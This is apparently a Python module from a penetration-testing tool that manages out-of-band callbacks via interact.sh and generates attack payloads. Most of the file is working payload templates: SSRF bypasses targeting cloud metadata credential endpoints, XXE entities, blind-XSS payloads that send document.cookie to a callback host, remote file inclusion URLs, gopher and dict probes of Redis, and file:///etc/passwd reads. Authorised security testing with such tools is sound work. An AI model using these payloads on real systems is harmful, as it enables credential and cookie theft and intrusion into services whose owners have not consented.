"""Out-of-band interaction manager."""

from __future__ import annotations

import hashlib
import json
import random
import string
import time
import uuid
from typing import Any
from urllib.parse import urlparse

import requests
from requests.exceptions import RequestException


# OOB Payload Templates

OOB_PAYLOADS = {
    "ssrf": {
        "basic": [
            "http://{callback}",
            "https://{callback}",
            "http://{callback}/ssrf",
            "http://{callback}:80/ssrf",
            "http://{callback}:443/ssrf",
        ],
        "bypass": [
            # URL encoding
            "http://%73%73%72%66.{callback}",
            # Decimal IP
            "http://0x7f000001/",
            # DNS rebinding (use callback for confirmation)
            "http://ssrf.{callback}",
            # Redirect chain
            "http://{callback}/redirect?url=http://169.254.169.254/latest/meta-data/",
            # IPv6
            "http://[::1]/",
            # URL with @
            "http://attacker@{callback}/",
        ],
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
        ],
    },
    "xxe": {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}">]><root>&xxe;</root>',
        ],
        "blind": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}/xxe-blind">%xxe;]><foo></foo>',
        ],
        "ssrf_via_xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        ],
    },
    "xss_blind": {
        "payloads": [
            '<img src="http://{callback}/xss" />',
            '<script src="http://{callback}/xss.js"></script>',
            '"><img src=x onerror="fetch(\'http://{callback}/xss?c=\'+document.cookie)">',
            '"><script>new Image().src="http://{callback}/xss?c="+document.cookie</script>',
            '"><script>fetch("http://{callback}/xss",{{method:"POST",body:document.cookie}})</script>',
        ],
    },
    "rfi": {
        "payloads": [
            "http://{callback}/rfi.php",
            "http://{callback}/rfi.txt",
        ],
    },
    "email": {
        "payloads": [
            "test@{callback}",
            "admin@{callback}",
        ],
    },
}


class OOBManager:
    """
    Manages out-of-band testing using interact.sh or custom callback servers.
    
    Provides:
      - Unique callback URLs per test
      - Payload generation for SSRF, XXE, XSS, etc.
      - Interaction polling and correlation
    """

    def __init__(
        self,
        interactsh_server: str = "oast.pro",
        custom_callback_url: str | None = None,
        timeout: int = 10,
    ) -> None:
        """
        Parameters
        ----------
        interactsh_server : str
            interact.sh compatible server domain.
        custom_callback_url : str, optional
            Your own callback server URL (e.g., Burp Collaborator, ngrok).
        timeout : int
            HTTP request timeout.
        """
        self.interactsh_server = interactsh_server
        self.custom_callback_url = custom_callback_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (VAPT-CLI OOB)"
        
        # Track payloads sent and their correlation IDs
        self._correlation_map: dict[str, dict] = {}
        self._interactions: list[dict] = []
        
        # Generate a unique session ID
        self._session_id = uuid.uuid4().hex[:12]
        
        # interactsh client state
        self._interactsh_token: str | None = None
        self._interactsh_registered = False

    def get_callback_url(self, label: str = "test") -> str:
        """
        Get a unique callback URL for a specific test.
        
        Parameters
        ----------
        label : str
            Human-readable label for correlation (e.g., "ssrf-api-transfer").
            
        Returns
        -------
        str: Callback URL that will record any interaction.
        """
        correlation_id = self._generate_correlation_id(label)
        
        if self.custom_callback_url:
            callback = f"{self.custom_callback_url.rstrip('/')}/{correlation_id}"
        else:
            callback = f"{correlation_id}.{self.interactsh_server}"
        
        self._correlation_map[correlation_id] = {
            "label": label,
            "callback": callback,
            "created_at": time.time(),
            "interactions": [],
        }
        
        return callback

    def get_callback_domain(self, label: str = "test") -> str:
        """Get just the domain (for DNS-based detection)."""
        correlation_id = self._generate_correlation_id(label)
        
        domain = f"{correlation_id}.{self.interactsh_server}"
        
        self._correlation_map[correlation_id] = {
            "label": label,
            "callback": domain,
            "created_at": time.time(),
            "interactions": [],
        }
        
        return domain

    def generate_payloads(self, vuln_type: str, label: str = "test") -> list[str]:
        """
        Generate OOB payloads for a specific vulnerability type.
        
        Parameters
        ----------
        vuln_type : str
            One of: ssrf, xxe, xss_blind, rfi, email
        label : str
            Label for correlation tracking.
            
        Returns
        -------
        list[str]: Payloads with callback URLs embedded.
        """
        callback = self.get_callback_url(f"{vuln_type}-{label}")
        
        payloads = []
        
        if vuln_type == "ssrf":
            templates = OOB_PAYLOADS["ssrf"]["basic"] + OOB_PAYLOADS["ssrf"]["bypass"]
            for template in templates:
                payloads.append(template.format(callback=callback))
        
        elif vuln_type == "xxe":
            templates = OOB_PAYLOADS["xxe"]["basic"] + OOB_PAYLOADS["xxe"]["blind"]
            for template in templates:
                payloads.append(template.format(callback=callback))
        
        elif vuln_type == "xss_blind":
            for template in OOB_PAYLOADS["xss_blind"]["payloads"]:
                payloads.append(template.format(callback=callback))
        
        elif vuln_type == "rfi":
            for template in OOB_PAYLOADS["rfi"]["payloads"]:
                payloads.append(template.format(callback=callback))
        
        elif vuln_type == "email":
            for template in OOB_PAYLOADS["email"]["payloads"]:
                payloads.append(template.format(callback=callback))
        
        return payloads

    def poll_interactions(self, wait_seconds: int = 30) -> list[dict]:
        """
        Poll for OOB interactions.
        
        Waits for the specified duration, then checks if any callbacks
        were triggered by the target server.
        
        Parameters
        ----------
        wait_seconds : int
            How long to wait before polling. Blind vulns may take time.
            
        Returns
        -------
        list[dict]: Confirmed interactions with correlation data.
        """
        if wait_seconds > 0:
            time.sleep(wait_seconds)
        
        interactions = []
        
        if self.custom_callback_url:
            interactions = self._poll_custom_server()
        else:
            interactions = self._poll_interactsh()
        
        # Correlate interactions with payloads
        for interaction in interactions:
            correlation_id = self._extract_correlation_id(interaction)
            if correlation_id and correlation_id in self._correlation_map:
                self._correlation_map[correlation_id]["interactions"].append(interaction)
                interaction["correlated_label"] = self._correlation_map[correlation_id]["label"]
        
        self._interactions.extend(interactions)
        return interactions

    def get_confirmed_findings(self) -> list[dict]:
        """
        Return findings that have been confirmed via OOB interactions.
        
        Each confirmed interaction proves the vulnerability is real.
        """
        confirmed = []
        
        for corr_id, data in self._correlation_map.items():
            if data["interactions"]:
                confirmed.append({
                    "label": data["label"],
                    "callback": data["callback"],
                    "interaction_count": len(data["interactions"]),
                    "first_interaction": data["interactions"][0],
                    "confirmed_at": time.time(),
                    "evidence": {
                        "correlation_id": corr_id,
                        "interactions": data["interactions"][:5],
                    },
                })
        
        return confirmed

    def _generate_correlation_id(self, label: str) -> str:
        """Generate a unique correlation ID for tracking."""
        raw = f"{self._session_id}-{label}-{time.time()}"
        return hashlib.md5(raw.encode()).hexdigest()[:16]

    def _extract_correlation_id(self, interaction: dict) -> str | None:
        """Extract correlation ID from an interaction record."""
        # Try to find our correlation ID in the interaction data
        raw = json.dumps(interaction)
        for corr_id in self._correlation_map:
            if corr_id in raw:
                return corr_id
        return None

    def _poll_interactsh(self) -> list[dict]:
        """Poll interact.sh compatible server for interactions."""
        interactions = []
        
        # interact.sh API polling
        try:
            poll_url = f"https://{self.interactsh_server}/poll"
            if self._interactsh_token:
                poll_url += f"?secret={self._interactsh_token}"
            
            resp = self.session.get(poll_url, timeout=self.timeout, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                for item in data.get("data", data.get("interactions", [])):
                    interactions.append({
                        "type": item.get("protocol", "unknown"),
                        "source_ip": item.get("remote-address", item.get("source", "")),
                        "timestamp": item.get("timestamp", ""),
                        "raw_data": item,
                        "full_id": item.get("full-id", ""),
                    })
        except (RequestException, json.JSONDecodeError, ValueError):
            pass
        
        # Fallback: DNS check for each correlation ID
        if not interactions:
            import socket
            for corr_id, data in self._correlation_map.items():
                domain = f"{corr_id}.{self.interactsh_server}"
                try:
                    result = socket.getaddrinfo(domain, None, socket.AF_INET)
                    if result:
                        interactions.append({
                            "type": "dns",
                            "domain": domain,
                            "resolved_to": result[0][4][0],
                            "correlation_id": corr_id,
                        })
                except socket.gaierror:
                    pass
        
        return interactions

    def _poll_custom_server(self) -> list[dict]:
        """Poll a custom callback server for interactions."""
        interactions = []
        
        try:
            poll_url = f"{self.custom_callback_url.rstrip('/')}/api/interactions"
            resp = self.session.get(
                poll_url,
                params={"session": self._session_id},
                timeout=self.timeout,
                verify=False,
            )
            if resp.status_code == 200:
                data = resp.json()
                interactions = data if isinstance(data, list) else data.get("interactions", [])
        except (RequestException, json.JSONDecodeError, ValueError):
            pass
        
        return interactions

    def generate_ssrf_payloads(self, callback_label: str = "ssrf") -> dict[str, list[str]]:
        """
        Generate comprehensive SSRF payloads with OOB callbacks.
        
        Returns categorized payloads for different SSRF bypass techniques.
        """
        callback = self.get_callback_url(callback_label)
        
        payloads = {
            "basic": [
                f"http://{callback}",
                f"https://{callback}",
            ],
            "ip_bypass": [
                "http://127.0.0.1/",
                "http://127.0.0.1:80/",
                "http://127.0.0.1:443/",
                "http://[::1]/",
                "http://0x7f000001/",
                "http://2130706433/",  # 127.0.0.1 as decimal
                "http://0177.0.0.1/",  # Octal
                "http://127.1/",
                "http://127.0.1/",
            ],
            "cloud_metadata": OOB_PAYLOADS["ssrf"]["cloud_metadata"],
            "dns_rebinding": [
                f"http://ssrf.{callback}",
                f"http://a.{callback}",
            ],
            "redirect": [
                f"http://{callback}/redirect?to=http://169.254.169.254/",
            ],
            "protocol": [
                f"gopher://127.0.0.1:6379/_INFO",
                f"dict://127.0.0.1:6379/info",
                f"file:///etc/passwd",
                f"ftp://{callback}/",
            ],
        }
        
        return payloads

    def register_interactsh(self) -> bool:
        """Register with an interact.sh server for interaction tracking."""
        try:
            register_url = f"https://{self.interactsh_server}/register"
            resp = self.session.post(register_url, timeout=self.timeout, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                self._interactsh_token = data.get("secret", data.get("token"))
                self._interactsh_registered = True
                return True
        except (RequestException, json.JSONDecodeError):
            pass
        return False

    @property
    def is_active(self) -> bool:
        """Check if OOB manager has active correlation tracking."""
        return len(self._correlation_map) > 0

    @property
    def pending_count(self) -> int:
        """Number of payloads awaiting interaction confirmation."""
        return sum(
            1 for data in self._correlation_map.values()
            if not data["interactions"]
        )

    @property
    def confirmed_count(self) -> int:
        """Number of confirmed OOB interactions."""
        return sum(
            1 for data in self._correlation_map.values()
            if data["interactions"]
        )
